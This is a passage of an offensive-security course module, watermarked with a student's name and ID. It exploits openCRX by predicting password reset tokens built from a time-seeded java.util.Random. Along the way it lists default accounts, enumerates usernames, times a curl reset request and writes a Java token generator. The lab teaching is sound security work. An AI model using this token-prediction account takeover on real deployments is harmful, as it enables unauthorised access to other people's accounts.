Using the Python and Jinja documentation, make changes to the template that will allow the 
output to display in the response. 
8.7 Wrapping Up 
In this module, we discussed a methodology to discover vulnerabilities in applications. We 
uncovered a SQL injection vulnerability that led to administrator access to ERPNext. 
With administrator access, we discovered a Server-Side Template Injection vulnerability that was 
blacklisting characters commonly used for exploitation. We devised a way to bypass the filter and 
execute commands against the system. 
This clearly demonstrates the risk of unchecked user input passing through rendering functions. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
300 
8.7.1.1.1 
 
9 openCRX Authentication Bypass and Remote Code 
Execution 
This module will cover the analysis and exploitation of several vulnerabilities in openCRX,139 an 
open source customer relationship management (CRM) web application written in Java. 
We will use white box techniques to exploit deterministic password reset tokens to gain access to 
the application. Once authenticated, we will combine two different exploits to gain remote code 
execution and create a web shell on the server. 
9.1 Getting Started 
In order to access the openCRX server, we have created a hosts file entry named “opencrx” in our 
Kali Linux VM. We recommend making this configuration change in your Kali machine to follow 
along. Revert the openCRX virtual machine from your student control panel before starting your 
work. Please refer to the Wiki to find the openCRX box credentials. 
As a first step we will need to SSH to the server and start the opencrx application by running 
opencrx.sh with the run parameter from the ~/crx/apache-tomee-plus-7.0.5/bin/ directory. 
kali@kali:~$ ssh student@opencrx 
student@opencrx's password:  
... 
student@opencrx:~$ cd crx/apache-tomee-plus-7.0.5/bin 
 
student@opencrx:~/crx/apache-tomee-plus-7.0.5/bin$ ./opencrx.sh run 
[Server@5caf905d]: Startup sequence initiated from main() method 
[Server@5caf905d]: Could not load properties from file 
[Server@5caf905d]: Using cli/default properties only 
[Server@5caf905d]: Initiating startup sequence... 
Listing 313 - Starting the openCRX application 
9.2 Password Reset Vulnerability Discovery 
Let’s examine openCRX in its default configuration, which runs on Apache TomEE.140 
Java web applications can be packaged in several different file formats, such as JARs, WARs, and 
EARs. All three of these file formats are essentially ZIP files with different extensions. 
Java Archive (JAR)141 files are typically used for stand-alone applications or libraries. 
Web Application Archive (WAR)142 files are used to collect multiple JARs and static content, such 
as HTML, into a single archive. 
 
139 (openCRX, 2020), http://www.opencrx.org/ 
140 (The Apache Software Foundation, 2016), https://tomee.apache.org/ 
141 (Wikipedia, 2020), https://en.wikipedia.org/wiki/JAR_(file_format) 
142 (Wikipedia, 2020), https://en.wikipedia.org/wiki/WAR_(file_format) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
301 
Enterprise Application Archive (EAR)143 files can contain multiple JARs and WARs to consolidate 
multiple web applications into a single file. 
How an application is packaged does not change its exploitability, but we should keep in mind 
there are different ways to package Java applications when we start searching for files we want 
to investigate. 
Let’s get an idea of how openCRX is set up using white box techniques. We will ssh to the server 
and inspect the application’s structure on the server using the tree command, limiting the depth 
to three sub-directories with -L 3. 
kali@kali:~$ ssh student@opencrx 
student@opencrx's password:  
... 
student@opencrx:~$ cd crx/apache-tomee-plus-7.0.5/ 
 
student@opencrx:~/crx/apache-tomee-plus-7.0.5$ tree -L 3 
. 
|-- airsyncdir 
|-- apps 
|   |-- opencrx-core-CRX 
|   |   |-- APP-INF 
|   |   |-- META-INF 
|   |   |-- opencrx-bpi-CRX 
|   |   |-- opencrx-bpi-CRX.war 
|   |   |-- opencrx-caldav-CRX 
|   |   |-- opencrx-caldav-CRX.war 
|   |   |-- opencrx-calendar-CRX 
|   |   |-- opencrx-calendar-CRX.war 
|   |   |-- opencrx-carddav-CRX 
|   |   |-- opencrx-carddav-CRX.war 
|   |   |-- opencrx-contacts-CRX 
|   |   |-- opencrx-contacts-CRX.war 
|   |   |-- opencrx-core-CRX 
|   |   |-- opencrx-core-CRX.war 
|   |   |-- opencrx-documents-CRX 
|   |   |-- opencrx-documents-CRX.war 
|   |   |-- opencrx-ical-CRX 
|   |   |-- opencrx-ical-CRX.war 
|   |   |-- opencrx-imap-CRX 
|   |   |-- opencrx-imap-CRX.war 
|   |   |-- opencrx-ldap-CRX 
|   |   |-- opencrx-ldap-CRX.war 
|   |   |-- opencrx-rest-CRX 
|   |   |-- opencrx-rest-CRX.war 
|   |   |-- opencrx-spaces-CRX 
|   |   |-- opencrx-spaces-CRX.war 
|   |   |-- opencrx-vcard-CRX 
|   |   |-- opencrx-vcard-CRX.war 
|   |   |-- opencrx-webdav-CRX 
|   |   |-- opencrx-webdav-CRX.war 
|   |-- opencrx-core-CRX.ear 
 
143 (Wikipedia, 2020), https://en.wikipedia.org/wiki/EAR_(file_format) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
302 
|-- bin 
... 
 
55 directories, 339 files 
Listing 314 - Examining the application structure on the server 
Based on the output above, we know that openCRX was packaged as an EAR file, which we can 
find at /home/student/crx/apache-tomee-plus-7.0.5/apps. 
There 
are 
also 
several 
WAR 
files 
inside 
/home/student/crx/apache-tomee-plus-
7.0.5/apps/opencrx-core-CRX. These files should also be inside the EAR file, eliminating the need 
to copy each individually to our box for analysis. 
Let’s disconnect from the server and use scp to copy opencrx-core-CRX.ear to our local Kali 
machine. Next, we’ll unzip it, passing in -d opencrx to extract the contents into a new directory. 
student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX$ exit 
logout 
Connection to opencrx closed. 
 
kali@kali:~$ scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-
CRX.ear . 
student@opencrx's password:  
opencrx-core-CRX.ear                                     100%   85MB 100.5MB/s   00:00 
 
kali@kali:~$ unzip -q opencrx-core-CRX.ear -d opencrx 
Listing 315 - Using scp to copy opencrx-core-CRX.ear 
Once we have extracted the contents of the EAR file, we can examine them on our Kali machine. 
kali@kali:~$ cd opencrx 
 
kali@kali:~/opencrx$ ls -al 
total 29184 
drwxr-xr-x  4 kali kali     4096 Feb 27 14:19 . 
drwxr-xr-x 51 kali kali     4096 Feb 27 14:19 .. 
drwxr-xr-x  3 kali kali     4096 Jan  2  2019 APP-INF 
drwxr-xr-x  2 kali kali     4096 Jan  2  2019 META-INF 
-rw-r--r--  1 kali kali     2028 Jan  2  2019 opencrx-bpi-CRX.war 
-rw-r--r--  1 kali kali     2027 Jan  2  2019 opencrx-caldav-CRX.war 
-rw-r--r--  1 kali kali  3908343 Jan  2  2019 opencrx-calendar-CRX.war 
-rw-r--r--  1 kali kali     2030 Jan  2  2019 opencrx-carddav-CRX.war 
-rw-r--r--  1 kali kali  3675357 Jan  2  2019 opencrx-contacts-CRX.war 
-rw-r--r--  1 kali kali 18285302 Jan  2  2019 opencrx-core-CRX.war 
-rw-r--r--  1 kali kali  1099839 Jan  2  2019 opencrx-documents-CRX.war 
-rw-r--r--  1 kali kali     2750 Jan  2  2019 opencrx-ical-CRX.war 
-rw-r--r--  1 kali kali     1785 Jan  2  2019 opencrx-imap-CRX.war 
-rw-r--r--  1 kali kali     1788 Jan  2  2019 opencrx-ldap-CRX.war 
-rw-r--r--  1 kali kali  2778171 Jan  2  2019 opencrx-rest-CRX.war 
-rw-r--r--  1 kali kali    70520 Jan  2  2019 opencrx-spaces-CRX.war 
-rw-r--r--  1 kali kali     2036 Jan  2  2019 opencrx-vcard-CRX.war 
-rw-r--r--  1 kali kali     2029 Jan  2  2019 opencrx-webdav-CRX.war 
Listing 316 - Viewing the extracted contents 
As we suspected earlier, the EAR file did contain the WAR files. Each WAR file is essentially a 
separate web application with its own static content. The common JAR files are in /APP-INF/lib. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
303 
We will come back to these JAR files. First, let’s examine the main application, opencrx-core-
CRX.war, in JD-GUI. 
 
Figure 241: Viewing opencrx-core-CRX.war in JD-GUI 
We could examine a Java web application by starting with its deployment descriptor,144 such as a 
web.xml file, to better understand how the application maps URLs to servlets. However, we’ll 
instead start with JSP145 files. We’re taking this approach because openCRX mixes application 
logic with HTML within the JSPs. 
In Java web applications, “servlet” is a shorthand for the classes that handle 
requests, such as HTTP requests. Each framework has its own versions of 
servlets; in general, they implement code that takes in a request and returns a 
response. Java Server Pages (JSP) are a form of servlet used for dynamic pages. 
JSPs can mix Java code with traditional HTML. 
Exploring the contents of the WAR file in JD-GUI, we find several JSP files which mention 
authentication and password resets. 
 
144 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Deployment_descriptor 
145 (Wikipedia, 2020), https://en.wikipedia.org/wiki/JavaServer_Pages 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
304 
 
Figure 242: Viewing JSPs in JD-GUI 
Since vulnerabilities in authentication and password reset functions can often be leveraged to 
gain authenticated access to a web application, we’ll inspect these functions first. If we can find 
and exploit a vulnerability that gives us access to a valid user account, we can then search for 
other post-authentication vulnerabilities. With that in mind, let’s explore the source code for 
RequestPasswordReset.jsp to discover how this application handles password resets. 
056  %><%@ page session="true" import=" 
057  java.util.*, 
058  java.net.*, 
059  java.util.Enumeration, 
060  java.io.PrintWriter, 
061  org.w3c.spi2.*, 
062  org.openmdx.portal.servlet.*, 
063  org.openmdx.base.naming.*, 
064  org.opencrx.kernel.generic.* 
Listing 317 - Code excerpt from RequestPasswordReset.jsp 
Several custom libraries are imported starting on line 56. The import attribute specifies which 
classes can be used within the JSP. This is similar to an import statement in a standard Java 
source file which adds application logic to the program. The org.opencrx.kernel.generic.* import 
on line 64 is especially interesting as the naming pattern fits the application we are examining. 
The "*" character in the import is a wildcard used to import all classes within the package. 
The file also contains additional application logic. The application code that handles password 
resets starts near the end of the file, around line 153. 
153     if(principalName != null && providerName != null && segmentName != null) { 
154         javax.jdo.PersistenceManagerFactory pmf = 
org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory(); 
155         javax.jdo.PersistenceManager pm = pmf.getPersistenceManager( 
156             SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
305 
segmentName,  
157             null 
158         ); 
159         try { 
160             org.opencrx.kernel.home1.jmi1.UserHome userHome = 
(org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById( 
161                 new 
Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", 
providerName, "segment", segmentName, "userHome", principalName) 
162             ); 
163             pm.currentTransaction().begin(); 
164             userHome.requestPasswordReset(); 
165             pm.currentTransaction().commit(); 
166             success = true; 
167         } catch(Exception e) { 
168             try { 
169                 pm.currentTransaction().rollback(); 
170             } catch(Exception ignore) {} 
171             success = false; 
172         } 
173     } else { 
174         success = false; 
175     } 
Listing 318 - Code excerpt from RequestPasswordReset.jsp 
Let’s step through the logic in this code block. In order to execute it, the if statement on line 153 
needs to evaluate to true, which means principalName, providerName, and segmentName cannot 
be null. On lines 160 and 161, the pm.getObjectById method call uses those values to get an 
org.opencrx.kernel.home1.jmi1.UserHome object. 
Line 164 calls a requestPasswordReset method on this object. We will need to find where this 
class is defined to continue tracing the password reset logic. If the class definition for UserHome 
was inside the WAR file we opened, we would be able to click on the linked method name in JD-
GUI. Since there is no clickable link, we know the class must be defined elsewhere. 
While we have been examining a WAR file, the overall application was deployed as an EAR file. 
EAR files include an application.xml file that contains deployment information, which includes the 
location of external libraries. Let’s check this file, which we can find in the META-INF directory. 
kali@kali:~/opencrx$ cat META-INF/application.xml 
<?xml version="1.0" encoding="UTF-8"?> 
<application id="opencrx-core-CRX-App" xmlns="http://java.sun.com/xml/ns/javaee" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="5" 
xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
http://java.sun.com/xml/ns/javaee/application_5.xsd"> 
    <display-name>openCRX EAR</display-name> 
    <module id="opencrx-core-CRX"> 
        <web> 
            <web-uri>opencrx-core-CRX.war</web-uri> 
            <context-root>opencrx-core-CRX</context-root> 
        </web> 
    </module> 
... 
    <library-directory>APP-INF/lib</library-directory> 
</application> 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
306 
Listing 319 - openCRX’s application.xml file 
The library-directory element specifies where external libraries are found within an EAR file. The 
opencrx-kernel.jar file is located in the extracted /APP-INF/lib directory. We should be able to find 
the UserHome class inside that JAR file based on naming conventions. 
 
Figure 243: Viewing opencrx-kernel.jar in JG-GUI 
While we do find the class there, it is just an interface.146 Interfaces define a list of methods 
(sometimes referred to as behaviors) but do not implement the actual code within those 
methods. Instead, classes can implement one or more interfaces. If a class implements an 
interface, it must include code for all the methods defined in that interface. 
To determine what the method call actually does, we will need to find a class that implements the 
interface. Let’s search for “requestPasswordReset” in JD-GUI to find other classes that might 
contain or call this method, making sure “Method” is checked when we perform our search. 
 
146 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Interface_(Java) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
307 
 
Figure 244: Searching for requestPasswordReset 
When we search the entire code base of opencrx-kernel.jar, we find five results for 
“requestPasswordReset”. If the name of a class is appended with “Impl”, it implements an 
interface. If we inspect org.opencrx.kernel.home1.aop2.UserHomeImpl.class, we will find a short 
method 
that 
calls 
the 
requestPasswordReset 
method 
of 
org.opencrx.kernel.backend.UserHomes.class. 
111  public Void requestPasswordReset() { 
112    try { 
113      UserHomes.getInstance().requestPasswordReset((UserHome) 
114        sameObject()); 
115       
116      return newVoid(); 
117    } catch (ServiceException e) { 
118      throw new JmiServiceException(e); 
119    }  
120  } 
Listing 320 - Code excerpt from UserHomeImpl.class 
Let’s inspect the requestPasswordReset function in that UserHomes class by clicking on 
requestPasswordReset within the try/catch block. 
324 public void requestPasswordReset(UserHome userHome) throws ServiceException { 
...    
336     String webAccessUrl = userHome.getWebAccessUrl(); 
337     if (webAccessUrl != null) { 
338       String resetToken = Utils.getRandomBase62(40); 
...        
341       String name = providerName + "/" + segmentName + " Password Reset"; 
342       String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : 
"/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + 
segmentName + "&id=" + principalName; 
343       String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
308 
"/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + 
segmentName + "&id=" + principalName; 
...      
363       changePassword((Password)loginPrincipal 
364           .getCredential(), null, "{RESET}" + resetToken); 
365     }  
366   } 
Listing 321 - Code excerpt from org.opencrx.kernel.backend.UserHomes.java 
The application makes a method call on line 338 to generate a token. The token is used in some 
strings like “resetConfirmUrl”, and ultimately passed to the changePassword method on line 364. 
To understand how that token is generated in Utils, we can open the source code by clicking on 
“getRandomBase62”. 
1038   public static String getRandomBase62(int length) { 
1039      String alphabet = 
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; 
1040     Random random = new Random(System.currentTimeMillis()); 
1041     String s = ""; 
1042     for (int i = 0; i < length; i++) { 
1043       s = s + 
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt
(62)); 
1044     } 
1045     return s; 
1046   } 
Listing 322 - Code excerpt from org.opencrx.kernel.utils.Util.java 
The getRandomBase62 method accepts an integer value and returns a randomly generated string 
of that length. There’s something wrong with this code however. Let’s investigate further. 
9.2.1 When Random Isn’t 
We will use javac147 and jshell148 in this section. If not already installed, let’s install them with sudo 
apt install openjdk-11-jdk-headless. We want to match the version of the JDK with the 
JRE we have installed in Kali, which we can confirm using java -version. 
The standard Java libraries have two primary random number generators: java.util.Random149 and 
java.security.SecureRandom.150 The names are somewhat of a giveaway here, but we will review 
the documentation for these two classes. 
First, let’s read about Random: 
An instance of this class is used to generate a stream of pseudorandom 
numbers. … If two instances of Random are created with the same seed, and the 
same sequence of method calls is made for each, they will generate and return 
identical sequences of numbers. … Instances of java.util.Random are not 
 
147 (Oracle, 2018), https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javac.html 
148 (Oracle, 2017), https://docs.oracle.com/javase/9/jshell/introduction-jshell.htm#JSHEL-GUID-630F27C8-1195-4989-9F6B-
2C51D46F52C8 
149 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html 
150 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
309 
cryptographically secure. Consider instead using SecureRandom to get a 
cryptographically secure pseudo-random number generator for use by security-
sensitive applications. 
We can use jshell to interactively run Java and observe this behavior in action. Let’s import the 
Random class, then declare and instantiate two instances of Random objects with the same seed 
value. Then, we can compare the output of calling the nextInt151 method on each Random object 
inside a for loop. 
kali@kali:~$ jshell 
|  Welcome to JShell -- Version 11.0.6 
|  For an introduction type: /help intro 
 
jshell> import java.util.Random; 
 
jshell> Random r1 = new Random(42); 
r1 ==> java.util.Random@26a1ab54 
 
jshell> Random r2 = new Random(42); 
r2 ==> java.util.Random@41cf53f9 
 
jshell> int x, y; 
x ==> 0 
y ==> 0 
 
jshell> for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){ 
System.out.println("They match! " + x);}} 
They match! -1170105035 
They match! 234785527 
They match! -1360544799 
They match! 205897768 
They match! 1325939940 
They match! -248792245 
They match! 1190043011 
They match! -1255373459 
They match! -1436456258 
They match! 392236186 
Listing 323 - Generating two random integers and comparing them in a for loop 
As the documentation described, identical sequences were generated from two different Random 
objects with the same seed value. 
Next, let’s read about SecureRandom: 
This class provides a cryptographically strong random number generator (RNG). 
A cryptographically strong random number minimally complies with the 
statistical random number generator tests specified in FIPS 140-2, Security 
Requirements for Cryptographic Modules, section 4.9.1. Additionally, 
SecureRandom must produce non-deterministic output. Therefore any seed 
material passed to a SecureRandom object must be unpredictable, and all 
 
151 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-- 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
310 
SecureRandom output sequences must be cryptographically strong, as 
described in RFC 1750: Randomness Recommendations for Security. 
Let’s observe this in action, again using jshell. SecureRandom objects use a byte array as a seed, 
so we’ll need to declare a byte array before we instantiate our objects. 
jshell> import java.security.SecureRandom; 
 
jshell> byte[] s = new byte[] { (byte) 0x2a } 
s ==> byte[1] { 42 } 
 
jshell> SecureRandom r1 = new SecureRandom(s); 
r1 ==> NativePRNG 
 
jshell> SecureRandom r2 = new SecureRandom(s); 
r2 ==> NativePRNG 
 
jshell> if(r1.nextInt() == r2.nextInt()) { System.out.println("They match!"); } else { 
System.out.println("No match."); } 
No match. 
 
jshell> /exit 
|  Goodbye 
Listing 324 - Comparing the output of two SecureRandom objects 
Even though they were instantiated with the same seed value, the two SecureRandom objects 
returned different results from the nextInt method. 
What does this mean for us? Let’s review the token generation code to remember what we are 
working with. 
1038   public static String getRandomBase62(int length) { 
1039      String alphabet = 
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; 
1040     Random random = new Random(System.currentTimeMillis()); 
1041     String s = ""; 
1042     for (int i = 0; i < length; i++) { 
1043       s = s + 
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt
(62)); 
1044     } 
1045     return s; 
1046   } 
Listing 325 - Code excerpt from org.opencrx.kernel.utils.Util.java 
The code in openCRX uses the regular Random class to generate password reset tokens; it is 
seeded with the results of System.currentTimeMillis(). This method returns “the difference, 
measured in milliseconds, between the current time and midnight, January 1, 1970 UTC”.152 
If we can predict when a token is requested, we should be able to generate a matching token by 
manipulating the seed value when creating our own Random object. We could even generate a list 
 
152 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/lang/System.html#currentTimeMillis-- 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
311 
of possible tokens, assuming there is no throttling or lockout for password resets on the server, 
and iterate through the list until we find a match. However, we also need an account to target. 
9.2.1.1 Exercises 
1. 
Use jshell to recreate the code blocks in this section. 
2. 
Compare ten outputs from SecureRandom objects using a for loop. 
9.2.2 Account Determination 
A default installation153 of openCRX has three accounts with the following username and 
password pairs: 
1. 
guest / guest 
 
2. 
admin-Standard / admin-Standard 
 
3. 
admin-Root / admin-Root 
With this in mind, let’s start Burp Suite and configure Firefox to use it as a proxy. 
We can use error messages from login and password reset pages to determine the validity of a 
submitted username. We can find the reset page by going to the login page in Listing 326 and 
submitting invalid credentials. This reveals the link to the password reset page. 
http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false 
Listing 326 - Login page URI 
Let’s submit a password reset for a default username to determine if if this page discloses valid 
user accounts. If we submit a valid account, the response indicates the password reset request 
was successful. 
 
Figure 245: Requesting a password reset for a valid account 
 
153 (openCRX, 2020), https://github.com/opencrx/opencrx-documentation/blob/master/Admin/InstallerServer.md 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
312 
9.2.2.1.1 
 
If we submit an invalid account, we receive an error message. 
 
Figure 246: Requesting a password reset for an invalid account 
The differences in the response indicate the existence of a “guest” account. Let’s use “guest” as 
our target account for the reset process. 
9.2.3 Timing the Reset Request 
In order to generate the correct password reset token, we need to guess the seed value, which is 
the exact millisecond that the token was generated. Thankfully, the value returned by 
System.currentTimeMillis() is already in UTC, so we don’t have to worry about time zone 
differences. 
We can get the milliseconds “since the epoch” using the date command in Kali with the %s flag. 
We’ll also use the %3N flag to include three digits of nanoseconds. This format will match the 
output of the Java method in milliseconds. 
We can get the range of potential seed values using the date command before and after we 
submit the reset request with curl. We will also use the -i flag to include response headers in 
the output. In order for this attack to succeed, the server time must be set to the correct date and 
time. We can use the Date154 response header to determine the server time. 
kali@kali:~$ date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 
'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N 
1582038122371 
HTTP/1.1 200  
Set-Cookie: JSESSIONID=367FD5747FB803124A0F504A1FC478B7; Path=/opencrx-core-CRX; 
HttpOnly 
Content-Type: text/html;charset=UTF-8 
Content-Length: 2282 
Date: Tue, 18 Feb 2020 15:02:02 GMT 
Server: Apache TomEE 
... 
1582038122769 
 
154 (Internet Engineering Task Force, 2014), https://tools.ietf.org/html/rfc7231#section-7.1.1.2 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
313 
Listing 327 - Submitting a password reset request with curl 
Based on the output, we can guess that the reset token was created with a seed value between 
1582038122371 and 1582038122769. This includes 398 possible seed values. 
This range varies based on network latency and server processing time. However, the seed is 
determined early in the password reset process, so it is likely to be closer to the start time rather 
than the end time. 
The server response included a Date header with the value of “Tue, 18 Feb 2020 15:02:02 GMT”. 
We can convert this value to the Unix epoch time using a site such as EpochConverter.155 
 
Figure 247: Converting the Date header to milliseconds since the epoch 
We do not get the same level of millisecond precision from the value of the Date header as we do 
from running the date command. The timestamp will always end in 000. However, we can use the 
header value as a sanity check to make sure our local values are in the correct range. 
In this case, the timestamps we calculated locally, 1582038122371 and 1582038122769, do 
roughly align with the value from the server (1582038122000). The values should be close 
enough to proceed with this attack. 
9.2.4 Generate Token List 
Now that we have the range of potential random seeds, we need to create our own token 
generator. Let’s create a file with our own Java class to generate the tokens to exploit the 
predictable random generation. The name of the class within the file must match the file name 
and end with “java” as the file extension. We will use touch to create an empty file named 
OpenCRXToken.java. 
kali@kali:~/opencrx$ touch OpenCRXToken.java 
Listing 328 - Creating an empty Java source file 
Next, let’s start by building out the basic outline of our class. We will need a class definition, a 
main method so that we can run the class from the command line, and a method that generates 
 
155 (Epoch Converter, 2020), https://www.epochconverter.com 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
314 
the 
tokens. 
We’ll 
copy 
much 
of 
the 
code 
that 
generates 
the 
tokens 
from 
org.opencrx.kernel.utils.Util.java, but we’ll modify it to accept the seed value so we can iterate 
through values as we generate tokens. We’ll also import java.util.Random to generate the tokens. 
A simple text editor like nano should suffice for editing the file. 
kali@kali:~/opencrx$ nano OpenCRXToken.java 
 
import java.util.Random; 
 
public class OpenCRXToken { 
   
  public static void main(String args[]) { } 
   
  public static String getRandomBase62(int length, long seed) { } 
} 
 
Listing 329 - Updating the Java source file 
Let’s build out the main method next. We will need an int variable for the length of the token, long 
variables for the start and stop seed values, and a String for the token values. We will use a for 
loop to iterate between the start and stop values, calling the getRandomBase62 method and 
passing in the seed value as it iterates. 
import java.util.Random; 
   
public class OpenCRXToken { 
   
  public static void main(String args[]) { 
    int length = 40; 
    long start = Long.parseLong("1582038122371"); 
    long stop = Long.parseLong("1582038122769"); 
    String token = ""; 
   
    for (long l = start; l < stop; l++) { 
      token = getRandomBase62(length, l); 
      System.out.println(token); 
    } 
  } 
   
  public static String getRandomBase62(int length, long seed) { 
   
  } 
} 
Listing 330 - OpenCRXToken.java 
We will set the start and stop values which are based on the timestamps from when we ran curl in 
Listing 327. Finally, we will copy the contents of the getRandomBase62 method from 
org.opencrx.kernel.utils.Util.java and modify it to use the seed value passed in to the method. 
Please note that for the sake of brevity, the function content is not included in the listing above. 
Once the values are set, we can compile the program with javac and run it with java, redirecting 
the output into a text file. We will also tail the file to make sure the tokens were written correctly. 
kali@kali:~/opencrx$ javac OpenCRXToken.java  
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
315 
kali@kali:~/opencrx$ java OpenCRXToken > tokens.txt 
 
kali@kali:~/opencrx$ tail tokens.txt 
SCKF9pp15wUrAZj84eC7m3Z1P5PexTb9wUetcF4T 
OA1Otn7zkpspZ7pa3kIxSFsKcRdRelTKaQhmPkf3 
aAycQmACHCk1cSdI4YKwnf8m464bmo2xjRtWldPY 
1C8wnnzbg47SPVBE55G1mMNOi5k8NeK3KSHEhwEz 
DA5AKo2oCR1dTp0u3uH07obqAkBIVhugTRTz3ryV 
88mJ3mJmtLNZpN5M5zOqmzu9N7P5Axls7NXrqJZ5 
K8iXdlOxPjGlvhu45nPp6QAdplpEK2LVEMieCEIb 
l8srznDOnZdCgkSy4MLv67PEWlWkvqdbrP7J7X84 
x8p5WnGZLwVOm4Hg4BMuRXdgySxv3vCE0OJ4UQqZ 
vMSsitoJwnrHnfB00BneUoeGxMxiQPj3UjkCnBNi 
Listing 331 - Compiling and running OpenCRXToken 
With our token list generated, we’ll next determine how to leverage it to complete the password 
reset process. 
9.2.4.1 Exercises 
1. 
Complete the code for OpenCRXToken class. 
2. 
Recreate the steps above to generate a token list. 
9.2.4.2 Extra Mile 
Update the token generator program to accept the start and stop values as command line 
parameters. 
9.2.5 Automating Resets 
When we examined the source code in UserHomes.class, we found the format of a reset link: 
 String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + 
"PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + 
segmentName + "&id=" + principalName; 
Listing 332 - Password reset link 
We have our tokens, but we will also need to provide values for providerName, segmentName, and 
id. Based on the password reset request we sent, we know the id value is the username. We can 
find clues for providerName and segmentName in the source code of RequestPasswordReset.jsp. 
234  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" 
method="POST" action="RequestPasswordReset.jsp" accept-charset="UTF-8"> 
235      <h2 class="form-signin-heading">Please enter your username, e-mail address or 
ID</h2>                   
236      <input type="text" name="id" id="id" autofocus="" placeholder="ID (e.g. 
guest@CRX/Standard)" class="form-control" /> 
237      <br /> 
238      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button> 
239      <br /> 
240      <%@ include file="request-password-reset-note.html" %> 
241  </form> 
Listing 333 - An example of provider and segment in RequestPasswordReset.jsp 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
316 
Line 236 defines the input field for id, which includes a placeholder value of 
“guest@CRX/Standard”. When we visit that page in our browser, we receive a different 
placeholder. 
 
Figure 248: Inspecting the password reset form 
The value “CRX” has been replaced with “ProviderName” and “Standard” has been replaced with 
“SegmentName”. We can find another example that matches this pattern by examining 
WizardInvoker.jsp in JD-GUI. 
65  /** 
66   *  The WizardInvoker is invoked with the following URL parameters: 
67   *  - wizard: path of the wizard JSP 
68   *  - provider: provider name 
69   *  - segment: segment name 
70   *  - xri: target object xri 
71   *  - user: user name 
72   *  - password: password 
